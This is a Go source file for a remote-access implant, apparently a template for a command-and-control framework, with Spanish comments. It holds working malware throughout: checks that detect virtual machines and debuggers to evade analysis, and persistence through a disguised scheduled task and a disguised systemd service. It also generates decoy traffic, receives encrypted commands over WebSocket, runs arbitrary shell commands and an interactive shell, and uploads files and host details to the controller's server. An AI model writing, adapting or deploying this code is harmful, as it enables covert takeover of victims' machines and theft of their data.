package main

import (
    "bytes"
    "context"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/tls"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    mathrand "math/rand"
    "io"
    "log"
    "mime/multipart"
    "net"
    "net/http"

    "os"
    "os/exec"
    "os/user"
    "path/filepath"
    "runtime"
    "strconv"
    "strings"
    "time"

    "github.com/gorilla/websocket"
	"github.com/creack/pty"
)

// === CONFIGURACIÓN DEL IMPLANTE ===
const (
    C2_URL       = "https://{lhost}:{lport}"
    CLIENT_ID    = "{line}"
    USERNAME     = "{username}"
    PASSWORD     = "{password}"
    SLEEP        = 10 * time.Second
    MALEABLE     = "{maleable}" // Ruta maleable para evitar detección
    USER_AGENT   = "{useragent}"
    MAX_RETRIES  = 3
    STEALTH      = "{stealth}"
    KEY_HEX      = "{key}" // Llave AES hex
)

var reverse_shell_port = 8080 // Puerto del listener del servidor

// Lista de User-Agents para evadir detección
var USER_AGENTS = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
}

// URLs para tráfico legítimo (evitar detección)
var URLS = []string{
    "https://www.google-analytics.com/collect?v=1&_v=j81&a=123456789&t=pageview&_s=1&dl=https%3A%2F%2Fexample.com%2F&ul=en-us&de=UTF-8&dt=Example%20Page",
    "https://api.azure.com/v1/status?client_id=123456789&region=us-east-1",
}

// Headers estándar
var HEADERS = map[string]string{
    "Accept":       "application/json",
    "Content-Type": "application/json",
    "Connection":   "keep-alive",
}

// Herramientas de debugging a detectar
var debugTools = map[string][]string{
    "windows": {"x64dbg", "ollydbg", "ida", "windbg", "processhacker"},
    "linux":   {"gdb", "strace", "ltrace", "radare2"},
    "darwin":  {"lldb", "dtrace", "instruments"},
}

// === FUNCIONES DE SEGURIDAD Y EVASIÓN ===

func isVMByMAC() bool {
    interfaces, err := net.Interfaces()
    if err != nil {
        fmt.Println("Error al obtener interfaces de red:", err)
        return false
    }
    vmMACPrefixes := []string{
        "00:05:69", "00:0C:29", "00:50:56", // VMware
        "08:00:27",                           // VirtualBox
        "52:54:00",                           // QEMU/KVM
    }
    for _, iface := range interfaces {
        mac := iface.HardwareAddr.String()
        for _, prefix := range vmMACPrefixes {
            if strings.HasPrefix(mac, prefix) {
                return true
            }
        }
    }
    return false
}

func checkDebuggers() bool {
    var cmd string
    switch runtime.GOOS {
    case "windows":
        cmd = "tasklist"
    case "linux", "darwin":
        cmd = "ps aux"
    default:
        return false
    }
    out, err := exec.Command("sh", "-c", cmd).Output()
    if err != nil {
        fmt.Println("Error:", err)
        return false
    }
    for _, tool := range debugTools[runtime.GOOS] {
        if strings.Contains(strings.ToLower(string(out)), tool) {
            return true
        }
    }
    return false
}

// === CIFRADO AES ===

type Aes256Key struct {
    Key []byte
}

type PacketEncryptionContext struct {
    AesKey  *Aes256Key
    Valid   bool
    Enabled bool
}

var encryptionCtx *PacketEncryptionContext

func initEncryptionContext(keyHex string) *PacketEncryptionContext {
    keyBytes, err := hex.DecodeString(keyHex)
    if err != nil {
        return nil
    }
    return &PacketEncryptionContext{
        AesKey:  &Aes256Key{Key: keyBytes},
        Valid:   true,
        Enabled: true,
    }
}

// === MODO SIGILOSO ===

var stealthModeEnabled bool

func initStealthMode() {
    if STEALTH == "True" || STEALTH == "true" {
        stealthModeEnabled = true
        fmt.Println("[INFO] Stealth mode initialized as ENABLED")
    } else {
        stealthModeEnabled = false
        fmt.Println("[INFO] Stealth mode initialized as DISABLED")
    }
}

func handleStealthCommand(command string) {
    switch command {
    case "stealth_on":
        stealthModeEnabled = true
        fmt.Println("[INFO] Stealth mode ENABLED by command")
    case "stealth_off":
        stealthModeEnabled = false
        fmt.Println("[INFO] Stealth mode DISABLED by command")
    }
}

// === TRÁFICO LEGÍTIMO ===

func simulateLegitimateTraffic() {
    for {
        userAgent := USER_AGENTS[mathrand.Intn(len(USER_AGENTS))]
        headers := make(http.Header)
        for key, value := range HEADERS {
            headers.Set(key, value)
        }
        headers.Set("User-Agent", userAgent)
        url := URLS[mathrand.Intn(len(URLS))]

        client := &http.Client{}
        req, _ := http.NewRequest("GET", url, nil)
        req.Header = headers
        resp, err := client.Do(req)
        if err != nil {
            continue
        }
        defer resp.Body.Close()

        if resp.StatusCode == 200 {
            fmt.Printf("[+] Simulación exitosa: %s\n", url)
        }
        time.Sleep(time.Duration(mathrand.Intn(31)+30) * time.Second)
    }
}

// === PERSISTENCIA ===

func ensurePersistence() error {
    executable, err := os.Executable()
    if err != nil {
        return fmt.Errorf("failed to get executable path: %w", err)
    }
    if runtime.GOOS == "windows" {
        taskName := "SystemMaintenanceTask"
        taskCmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc daily /f`, taskName, executable)
        return exec.Command("cmd", "/C", taskCmd).Run()
    }
    if runtime.GOOS == "linux" {
        serviceContent := fmt.Sprintf(`
[Unit]
Description=System Maintenance Service
[Service]
ExecStart=%s
Restart=always
User=%s
[Install]
WantedBy=multi-user.target
`, executable, os.Getenv("USER"))
        servicePath := "/etc/systemd/system/system-maintenance.service"
        err := os.WriteFile(servicePath, []byte(serviceContent), 0644)
        if err != nil {
            return err
        }
        return exec.Command("systemctl", "enable", "system-maintenance").Run()
    }
    return nil
}

// === REINICIO EN CASO DE ERROR ===

func globalRecover() {
    if r := recover(); r != nil {
        log.Printf("[RECOVER] Critical error: %v\n", r)
        restartClient()
    }
}

func restartClient() {
    executable, _ := os.Executable()
    cmd := exec.Command(executable)
    cmd.Start()
    os.Exit(1)
}

// === CIFRADO DE PAQUETES ===

func EncryptPacket(ctx *PacketEncryptionContext, packet []byte) ([]byte, error) {
    block, err := aes.NewCipher(ctx.AesKey.Key)
    if err != nil {
        return nil, err
    }
    iv := make([]byte, aes.BlockSize)
    rand.Read(iv)
    encryptedData := make([]byte, aes.BlockSize+len(packet))
    copy(encryptedData, iv)
    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(encryptedData[aes.BlockSize:], packet)
    return encryptedData, nil
}

func DecryptPacket(ctx *PacketEncryptionContext, encryptedData []byte) ([]byte, error) {
    block, err := aes.NewCipher(ctx.AesKey.Key)
    if err != nil {
        return nil, err
    }
    if len(encryptedData) < aes.BlockSize {
        return nil, errors.New("encrypted data too short")
    }
    iv := encryptedData[:aes.BlockSize]
    encryptedData = encryptedData[aes.BlockSize:]
    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(encryptedData, encryptedData)
    return encryptedData, nil
}

// === COMUNICACIÓN CON EL C2 ===

func sendRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
    tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
    client := &http.Client{Transport: tr, Timeout: 30 * time.Second}
    var req *http.Request
    var err error

    if filePath != "" {
        file, err := os.Open(filePath)
        if err != nil {
            return nil, err
        }
        defer file.Close()
        bodyBuffer := &bytes.Buffer{}
        writer := multipart.NewWriter(bodyBuffer)
        part, _ := writer.CreateFormFile("file", filepath.Base(filePath))
        io.Copy(part, file)
        writer.Close()
        req, err = http.NewRequestWithContext(ctx, method, url, bodyBuffer)
        req.Header.Set("Content-Type", writer.FormDataContentType())
    } else {
        encryptedBody, _ := EncryptPacket(encryptionCtx, []byte(body))
        base64Body := base64.StdEncoding.EncodeToString(encryptedBody)
        req, err = http.NewRequestWithContext(ctx, method, url, strings.NewReader(base64Body))
        req.Header.Set("Content-Type", "text/plain")
    }
    req.Header.Set("User-Agent", USER_AGENT)

    resp, err := client.Do(req)
    if err != nil {
        return nil, err
    }
    if resp.StatusCode != http.StatusOK {
        defer resp.Body.Close()
        raw, _ := io.ReadAll(resp.Body)
        return nil, fmt.Errorf("server error %d: %s", resp.StatusCode, raw)
    }
    defer resp.Body.Close()
    rawResponse, _ := io.ReadAll(resp.Body)
    decryptedResponse, _ := DecryptPacket(encryptionCtx, rawResponse)
    resp.Body = io.NopCloser(bytes.NewReader(decryptedResponse))
    return resp, nil
}


func retryRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
    for i := 0; i < MAX_RETRIES; i++ {
        resp, err := sendRequest(ctx, url, method, body, filePath)
        if err == nil {
            return resp, nil
        }
        select {
        case <-ctx.Done():
            return nil, ctx.Err()
        case <-time.After(SLEEP):
        }
    }
    return nil, fmt.Errorf("max retries reached")
}

// === EJECUCIÓN DE COMANDOS ===

func executeCommandWithRetry(shellCommand []string, command string) (string, error) {
    ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
    defer cancel()
    for i := 0; i < MAX_RETRIES; i++ {
        cmd := exec.CommandContext(ctx, shellCommand[0], append(shellCommand[1:], command)...)
        var out bytes.Buffer
        cmd.Stdout = &out
        cmd.Stderr = &out
        err := cmd.Run()
        if err == nil {
            return out.String(), nil
        }
        time.Sleep(2 * time.Second)
    }
    return "", fmt.Errorf("command failed after %d attempts", MAX_RETRIES)
}

func getShellCommand() []string {
    switch runtime.GOOS {
    case "windows":
        if _, err := exec.LookPath("powershell"); err == nil {
            return []string{"powershell", "-Command"}
        }
        return []string{"cmd", "/C"}
    case "linux", "darwin":
        if _, err := exec.LookPath("bash"); err == nil {
            return []string{"bash", "-c"}
        }
        return []string{"sh", "-c"}
    default:
        return []string{"sh", "-c"}
    }
}

// === MANEJO DE IP ===

func getIPs() []string {
    var ips []string
    addrs, _ := net.InterfaceAddrs()
    for _, addr := range addrs {
        if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
            ips = append(ips, ipnet.IP.String())
        }
    }
    return ips
}

// === COMUNICACIÓN WEBSOCKET ===
var upgrader = websocket.Upgrader{
    ReadBufferSize:  1024,
    WriteBufferSize: 1024,
    CheckOrigin: func(r *http.Request) bool {
		return true
	},
}
// Procesar respuesta JSON
func processResponseJSON(jsonStr string) {
	var response struct {
		Output string `json:"output"`
		Error  string `json:"error,omitempty"`
	}
	
	if err := json.Unmarshal([]byte(jsonStr), &response); err != nil {
		log.Printf("[WARN] No se pudo interpretar respuesta JSON: %s", jsonStr)
		return
	}
	
	if response.Error != "" {
		log.Printf("[ERROR] Servidor: %s", response.Error)
	} else if response.Output != "" {
		fmt.Println(response.Output)
	}
}

func getWebSocketURL(baseURL string) string {
    if strings.HasPrefix(baseURL, "https://") {
        return "wss://" + baseURL[len("https://"):]
    } else if strings.HasPrefix(baseURL, "http://") {
        return "ws://" + baseURL[len("http://"):]
    }
    return baseURL
}
func connectToSocketIO() (*websocket.Conn, error) {
    wsBase := getWebSocketURL(C2_URL)
    wsURL := fmt.Sprintf("%s/socket.io/?EIO=4&transport=websocket", wsBase)

    dialer := websocket.Dialer{
        ReadBufferSize:  1024,
        WriteBufferSize: 1024,
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }

    conn, _, err := dialer.Dial(wsURL, nil)
    if err != nil {
        return nil, err
    }

    // Read initial handshake message
    _, msg, _ := conn.ReadMessage()
    log.Printf("[DEBUG] Socket.IO handshake: %s", string(msg))

    // Send connection message to /terminal namespace
    connectMsg := fmt.Sprintf("40/terminal,{\"client_id\":\"%s\",\"platform\":\"%s\"}", CLIENT_ID, runtime.GOOS)
    conn.WriteMessage(websocket.TextMessage, []byte(connectMsg))

    return conn, nil
}
func connectToC2WebSocket() (*websocket.Conn, error) {
	wsBase := getWebSocketURL(C2_URL)
	wsURL := fmt.Sprintf("%s/terminal?client_id=%s&platform=%s",
		wsBase, CLIENT_ID, runtime.GOOS)

	dialer := websocket.Dialer{
		ReadBufferSize:  1024,
		WriteBufferSize: 1024,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	conn, resp, err := dialer.Dial(wsURL, nil)
	if err != nil {
		if resp != nil {
			body, _ := io.ReadAll(resp.Body)
			log.Printf("[ERROR] Handshake fallido: %d - %s\n", resp.StatusCode, string(body))
		}
		return nil, err
	}

	return conn, nil
}

func handleUploadWS(conn *websocket.Conn, command string) {
    filePath := strings.TrimPrefix(command, "upload:")
    _, err := retryRequest(context.Background(), C2_URL+MALEABLE+"/upload", "POST", "", filePath)
    if err != nil {
        conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Upload failed: %v", err)))
        return
    }
    conn.WriteMessage(websocket.TextMessage, []byte("Upload complete"))
}

func handleDownloadWS(conn *websocket.Conn, command string) {
    filePath := strings.TrimPrefix(command, "download:")
    fileURL := C2_URL + MALEABLE + "/download/" + filePath

    ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
    defer cancel()

    resp, err := retryRequest(ctx, fileURL, "GET", "", "")
    if err != nil {
        conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Download failed: %v", err)))
        return
    }

    fileData, _ := io.ReadAll(resp.Body)
    os.WriteFile(filepath.Base(filePath), fileData, 0644)
    conn.WriteMessage(websocket.TextMessage, []byte("Download complete"))
}

func handleCommandWS(conn *websocket.Conn, command string) {
    shellCommand := getShellCommand()
    output, err := executeCommandWithRetry(shellCommand, command)
    if err != nil {
        output = fmt.Sprintf("Error: %v", err)
    }

    pid := os.Getpid()
    hostname, _ := os.Hostname()
    ips := getIPs()
    currentUser, _ := user.Current()

    jsonData, _ := json.Marshal(map[string]string{
        "output":   output,
        "client":   runtime.GOOS,
        "command":  command,
        "pid":      strconv.Itoa(pid),
        "hostname": hostname,
        "ips":      strings.Join(ips, ", "),
        "user":     currentUser.Username,
    })

    encrypted, _ := EncryptPacket(encryptionCtx, jsonData)
    conn.WriteMessage(websocket.BinaryMessage, encrypted)
}

func handleWebSocket(conn *websocket.Conn) {
    ptyChannel := make(chan string, 10)
    
    go func() {
        for output := range ptyChannel {
            encrypted, _ := EncryptPacket(encryptionCtx, []byte(output))
            conn.WriteMessage(websocket.BinaryMessage, encrypted)
        }
    }()
    
    for {
        _, msg, err := conn.ReadMessage()
        if err != nil {
            log.Printf("[ERROR] Lectura WebSocket falló: %v\n", err)
            break
        }

        decryptedMsg, decryptErr := DecryptPacket(encryptionCtx, msg)
        if decryptErr != nil {
            log.Printf("[ERROR] Error al descifrar mensaje: %v\n", decryptErr)
            continue
        }

        command := strings.TrimSpace(string(decryptedMsg))
        if command == "" {
            continue
        }

        handleStealthCommand(command)

        if stealthModeEnabled {
            continue
        }

        // Manejar comandos complejos
        switch {
        case strings.HasPrefix(command, "download:"):
            go handleDownloadWS(conn, command)
        case strings.HasPrefix(command, "upload:"):
            go handleUploadWS(conn, command)
        case command == "terminate":
            os.Exit(0)
        default:
            go handleCommandWS(conn, command)
        }
    }
}

func startPTYProcess(ptyChannel chan string) (*exec.Cmd, error) {
    shell := getShellCommand()
    cmd := exec.Command(shell[0], append(shell[1:], "-i")...)
    ptyFile, err := pty.Start(cmd)
    if err != nil {
        return nil, err
    }

    go func() {
        buf := make([]byte, 1024)
        for {
            n, err := ptyFile.Read(buf)
            if err != nil {
                log.Printf("[ERROR] Fallo al leer PTY: %v\n", err)
                break
            }
            ptyChannel <- string(buf[:n])
        }
    }()

    return cmd, nil
}

func handleEncryptedCommand(command string, ptyProcess *exec.Cmd, channel chan string) {
    switch {
    case strings.HasPrefix(command, "stealth_"):
        handleStealthCommand(command)
    case command == "ping":
        channel <- "pong"
    case command == "start_interactive":
        startInteractiveSession(ptyProcess, channel)
    default:
        out, err := exec.Command("sh", "-c", command).CombinedOutput()
        if err != nil {
            channel <- fmt.Sprintf("[ERROR] %v\n", err)
        } else {
            channel <- string(out) + "\n"
        }
    }
}

func startInteractiveSession(cmd *exec.Cmd, channel chan string) {
    go func() {
        for {
            select {
            case input := <-interactiveChannel:
                if _, err := ptyFile.Write([]byte(input + "\n")); err != nil {
                    log.Printf("[ERROR] Escritura en PTY falló: %v\n", err)
                }
            }
        }
    }()
    channel <- "Sesión interactiva iniciada\n"
}

// === FUNCIÓN PRINCIPAL ===

var interactiveChannel = make(chan string, 10)
var ptyFile *os.File

func main() {

    defer globalRecover()
    mathrand.Seed(time.Now().UnixNano())

    key := initEncryptionContext(KEY_HEX)
    if key == nil {
        log.Fatal("[ERROR] No se pudo inicializar contexto de cifrado")
    }
    initStealthMode()

    ensurePersistence()

    
    for {
        conn, err := connectToC2WebSocket()
        if err == nil {
            log.Println("[INFO] Conexión WebSocket establecida")
            go handleWebSocket(conn)
			go simulateLegitimateTraffic()
        } else {
            log.Printf("[INFO] Reconectando... (%v)\n", err)
            time.Sleep(10 * time.Second)
			conn, err = connectToSocketIO()
			if err != nil {
				log.Fatalf("[ERROR] No se pudo conectar a Socket.IO: %v", err)
			}			
        }
    }
}